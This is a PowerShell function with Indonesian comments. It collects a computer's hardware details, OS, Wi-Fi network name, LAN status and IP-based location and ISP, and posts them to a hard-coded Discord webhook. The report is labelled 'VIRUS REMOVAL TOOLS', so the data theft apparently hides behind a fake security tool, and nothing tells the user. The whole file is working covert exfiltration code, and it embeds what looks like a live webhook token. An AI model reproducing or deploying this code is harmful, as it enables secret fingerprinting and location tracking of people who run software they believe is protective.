function webhooks {
    # Webhook Discord (Ganti dengan milik Anda)
    $discordWebhookUrl = "https://discordapp.com/api/webhooks/1337473337823203381/0gtdn-CLf_3uhKb1skosboqeWKwF2S9DQ6H-m10B4C0NVVll2v435GbwsU4I-tCOBkAh"

    # Ambil informasi sistem dengan PowerShell
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
    $manufacturer = $computerSystem.Vendor
    $tipe = $computerSystem.Version
    $systemmodel = $computerSystem.Name
    $os = Get-CimInstance Win32_OperatingSystem
    $cpu = Get-CimInstance Win32_Processor
    $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
    $disk = Get-CimInstance Win32_DiskDrive | ForEach-Object { "$($_.Model) - $([math]::Round($_.Size / 1GB, 2)) GB" }

    # Mendapatkan nama Wi-Fi yang terhubung
    $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
    if ($wifi) {
        $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
    } else {
        $wifiName = "Tidak ada Wi-Fi yang terhubung."
    }
    # Mengecek koneksi internet melalui LAN
    $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
    if ($lanAdapter) {
        $lanStatus = "LAN terhubung: $($lanAdapter.Name)"
        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
        if ($pingResult.StatusCode -eq 0) {
            $internetStatus = "Internet melalui LAN terhubung."
        } else {
            $internetStatus = "Internet melalui LAN tidak terhubung."
        }
    } else {
        $lanStatus = "Tidak ada LAN yang terhubung."
        $internetStatus = "Internet melalui LAN tidak tersedia."
    }

    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"

    # Format pesan ringkas
    $message = @"
    **:shield: VIRUS REMOVAL TOOLS**

    **:computer: SYSTEM INFO**
    Merek: $manufacturer
    Model: $tipe ($systemmodel)
    OS: $($os.Caption) ($($os.Version))
    CPU: $($cpu.Name) ($($cpu.NumberOfCores) Cores, $($cpu.NumberOfLogicalProcessors) Threads)
    RAM: $([math]::Round($ram, 2)) GB
    Disk: $($disk -join ", ")

    **:globe_with_meridians: NETWORK**
    SSID: $wifiName
    LAN: $lanStatus
    $internetStatus
    Lokasi: $($ipInfo.city), $($ipInfo.country) ($($ipInfo.zip))
    ISP: $($ipInfo.isp)

"@

    $body = @{ content = $message } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
}